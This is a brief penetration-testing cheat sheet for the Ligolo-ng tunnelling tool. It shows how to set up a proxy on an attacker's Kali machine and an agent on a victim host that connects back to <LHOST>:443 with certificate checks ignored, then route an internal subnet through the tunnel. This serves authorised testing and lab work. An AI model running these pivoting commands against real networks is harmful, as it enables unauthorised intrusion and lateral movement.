# Ligolo-ng

### Ligolo-ng

-  https://github.com/nicocha30/ligolo-ng

### Download Proxy and Agent

```bash
wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_agent_0.4.3_Linux_64bit.tar.gz

wget https://github.com/nicocha30/ligolo-ng/releases/download/v0.4.3/ligolo-ng_proxy_0.4.3_Linux_64bit.tar.gz
```

### Prepare Tunnel Interface (in Kali Machine)

```bash
$ sudo ip tuntap add user $(whoami) mode tun ligolo
```

```bash
$ sudo ip link set ligolo up
```

### Setup Proxy on Attacker Machine

```bash
$ ./proxy -laddr <LHOST>:443 -selfcert
```

### Setup Agent on Target Machine (in Victim’s Machine)

```bash
$ ./agent -connect <LHOST>:443 -ignore-cert
```

### Session

```bash
ligolo-ng » session
```

```bash
[Agent : user@target] » ifconfig
```

```bash
# in kali normal terminal , not inside ligolo shell
$ sudo ip r add 172.16.1.0/24 dev ligolo
```

```bash
[Agent : user@target] » start
```
